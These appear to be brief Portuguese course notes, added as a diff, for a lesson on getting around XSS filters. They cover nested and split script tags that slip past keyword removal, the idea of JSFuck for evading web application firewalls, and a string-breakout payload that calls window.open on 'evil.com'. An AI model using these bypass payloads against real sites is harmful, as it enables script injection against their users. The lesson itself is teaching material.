@@ -1,0 +1,44 @@
+
+Aula 5 -> Quebrando FIltros de segurança para XSS (bypass removendo palavra 'script',
+Bypass Web Application Firewall por JSFuck, bypass error NAN)
+
+
+
+
+https://www.php.net/manual/en/function.str-replace.php
+
+
+str_replace('o que você quer substituir', 'o que colocar no lugar', de onde está vindo isto que você quer substituir);
+
+https://www.php.net/manual/en/function.strtolower.php
+
+
+
+
+<scrSCRIPTipt>
+
+<scr      ipt>
+
+<script>
+
+
+https://pt.wikipedia.org/wiki/Web_Application_Firewall
+
+https://en.wikipedia.org/wiki/JSFuck
+
+
+http://www.jsfuck.com/
+
+
+
+
+2 + alert(1)
+
+
+teste") - window.open('https://evil.com')("
+
+
+
+
+
+
